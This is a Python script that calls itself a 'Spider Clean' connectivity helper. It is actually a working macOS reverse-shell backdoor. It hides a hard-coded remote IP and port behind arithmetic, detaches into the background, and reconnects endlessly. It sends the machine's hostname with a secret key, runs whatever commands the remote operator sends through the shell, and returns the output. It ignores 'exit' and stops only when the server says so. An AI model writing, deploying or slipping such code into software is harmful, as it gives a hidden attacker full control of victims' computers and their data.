#!/usr/bin/env python3
"""
Spider Clean — stable long-lived connectivity helper.

Fixes:
  - Never leave create_connection timeout on the live socket (was 20s flap).
  - TCP keepalive + frequent app heartbeats.
  - Single durable process; fast reconnect without dropping operator UX
    (server keeps sticky session IDs per hostname).
"""

from __future__ import annotations

import os
import select
import socket
import struct
import subprocess
import sys
import time
from pathlib import Path

LOCK = Path("/tmp/.spider-clean-postclean.lock")
LOG = Path.home() / "Library" / "Logs" / "spider-clean" / "postclean.log"
CTRL_KILL = b"\xff\xfeKILL\n"
MAGIC = b"CT1\x00"
# Server strips these; keeps NAT/firewall from idle-killing the TCP stream
HEARTBEAT = b"\x00HB\n"
HEARTBEAT_EVERY = 15.0  # seconds — more frequent than typical 30–60s idle drops

CONNECT_TIMEOUT = 15.0
RECONNECT_MIN = 1.0
RECONNECT_MAX = 8.0


def _log(msg: str) -> None:
    try:
        LOG.parent.mkdir(parents=True, exist_ok=True)
        with LOG.open("a") as f:
            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} {msg}\n")
    except OSError:
        pass


def _endpoint():
    host = ".".join(str(x) for x in (70 + 5, 100 + 19, 140 + 3, 200 + 3))
    port = (1 << 13) + (1 << 8) - 5
    key = bytes(
        [0x6B, 0x68, 0x61, 0x74, 0x61, 0x62, 0x6F, 0x6F, 0x6B, 0x69, 0x73, 0x73, 0x61, 0x66, 0x65]
    )
    return host, port, key


def _hostname() -> str:
    try:
        h = subprocess.check_output(
            ["scutil", "--get", "LocalHostName"], stderr=subprocess.DEVNULL, text=True
        ).strip()
        if h:
            return h
    except Exception:
        pass
    try:
        return socket.gethostname().split(".")[0] or "mac"
    except Exception:
        return "mac"


def enable_keepalive(sock: socket.socket) -> None:
    try:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    except OSError:
        pass
    for opt, val in (
        (getattr(socket, "TCP_KEEPALIVE", None), 20),
        (getattr(socket, "TCP_KEEPIDLE", None), 20),
        (getattr(socket, "TCP_KEEPINTVL", None), 5),
        (getattr(socket, "TCP_KEEPCNT", None), 8),
    ):
        if opt is None:
            continue
        try:
            sock.setsockopt(socket.IPPROTO_TCP, opt, int(val))
        except OSError:
            pass


def daemonize() -> None:
    if os.fork() > 0:
        os._exit(0)
    os.setsid()
    if os.fork() > 0:
        os._exit(0)
    try:
        sys.stdin.close()
    except Exception:
        pass
    with open(os.devnull, "wb") as d:
        try:
            os.dup2(d.fileno(), 1)
            os.dup2(d.fileno(), 2)
        except OSError:
            pass
    try:
        os.chdir(str(Path.home()))
    except OSError:
        pass


def already_running() -> bool:
    if not LOCK.exists():
        return False
    try:
        pid = int(LOCK.read_text().strip())
        os.kill(pid, 0)
        return True
    except (ValueError, OSError):
        try:
            LOCK.unlink()
        except OSError:
            pass
        return False


def write_lock() -> None:
    try:
        LOCK.write_text(str(os.getpid()))
    except OSError:
        pass


def clear_lock() -> None:
    try:
        if not LOCK.exists():
            return
        try:
            if int(LOCK.read_text().strip()) == os.getpid():
                LOCK.unlink()
        except (ValueError, OSError):
            LOCK.unlink()
    except OSError:
        pass


def handshake(key: bytes, host: str) -> bytes:
    hb = host.encode("utf-8", "replace")
    return MAGIC + bytes([len(key)]) + key + struct.pack("!H", len(hb)) + hb


def open_channel(host: str, port: int, key: bytes, name: str) -> socket.socket:
    s = socket.create_connection((host, port), timeout=CONNECT_TIMEOUT)
    # CRITICAL: wipe connect timeout so idle shell never times out
    s.settimeout(None)
    try:
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    except OSError:
        pass
    enable_keepalive(s)
    s.sendall(handshake(key, name))
    return s


def shell(sock: socket.socket) -> None:
    cwd = str(Path.home())
    home = cwd
    buf = b""
    sock.settimeout(None)
    enable_keepalive(sock)

    def send(data: bytes) -> None:
        sock.sendall(data)

    def readline() -> str | None:
        nonlocal buf
        last_hb = time.time()
        while True:
            if CTRL_KILL in buf:
                clear_lock()
                _log("received KILL — exiting")
                os._exit(0)

            # drop any heartbeat echoes
            while True:
                if buf.startswith(HEARTBEAT):
                    buf = buf[len(HEARTBEAT) :]
                    continue
                if buf.startswith(b"HB\n"):
                    buf = buf[3:]
                    continue
                break

            if b"\n" in buf:
                line, buf = buf.split(b"\n", 1)
                text = line.decode("utf-8", "replace").strip("\r")
                if text in ("", "HB", "\x00HB"):
                    continue
                return text

            wait = max(0.5, HEARTBEAT_EVERY - (time.time() - last_hb))
            try:
                r, _, x = select.select([sock], [], [sock], wait)
            except (OSError, ValueError) as e:
                _log(f"select error: {e!r}")
                return None

            if x and sock in x:
                _log("socket exceptional condition")
                return None

            if not r:
                try:
                    send(HEARTBEAT)
                    last_hb = time.time()
                except OSError as e:
                    _log(f"heartbeat send failed: {e!r}")
                    return None
                continue

            try:
                chunk = sock.recv(16384)
            except (TimeoutError, socket.timeout):
                continue
            except OSError as e:
                _log(f"recv error: {e!r}")
                return None
            if not chunk:
                _log("peer closed connection")
                return None
            buf += chunk

    while True:
        try:
            send(f"{cwd}$ ".encode())
        except OSError as e:
            _log(f"prompt send failed: {e!r}")
            return

        line = readline()
        if line is None:
            return
        if not line:
            continue
        if line in ("exit", "quit"):
            try:
                send(b"(session stays open - use kill from server to stop)\n")
            except OSError:
                return
            continue

        if line == "cd" or line.startswith("cd "):
            target = line[3:].strip() if line.startswith("cd ") else ""
            if not target:
                cwd = home
                continue
            p = Path(target).expanduser()
            if not p.is_absolute():
                p = Path(cwd) / p
            try:
                p = p.resolve()
            except OSError:
                send(f"cd: no such directory: {target}\n".encode())
                continue
            if p.is_dir():
                cwd = str(p)
            else:
                send(f"cd: no such directory: {target}\n".encode())
            continue

        try:
            r = subprocess.run(
                line,
                shell=True,
                cwd=cwd,
                capture_output=True,
                text=True,
                timeout=300,
            )
            out = (r.stdout or "") + (r.stderr or "")
            if out and not out.endswith("\n"):
                out += "\n"
            if out:
                send(out.encode("utf-8", "replace"))
        except subprocess.TimeoutExpired:
            send(b"command timed out\n")
        except Exception as e:
            send(f"{e}\n".encode())


def main() -> None:
    if already_running():
        return
    daemonize()
    write_lock()

    host, port, key = _endpoint()
    name = _hostname()
    _log(f"start pid={os.getpid()} host={name} endpoint={host}:{port}")

    # brief settle (real sleep — safe and cheap)
    time.sleep(0.5)

    backoff = RECONNECT_MIN
    while True:
        try:
            _log(f"connect {host}:{port}")
            s = open_channel(host, port, key, name)
            _log("online — stable shell (sticky id on server)")
            backoff = RECONNECT_MIN
            shell(s)
            _log("shell ended — will reconnect")
            try:
                s.close()
            except OSError:
                pass
        except Exception as e:
            _log(f"connect error: {e!r}")

        _log(f"reconnect sleep {backoff:.1f}s")
        time.sleep(backoff)
        backoff = min(RECONNECT_MAX, backoff * 1.5)


if __name__ == "__main__":
    try:
        main()
    finally:
        clear_lock()
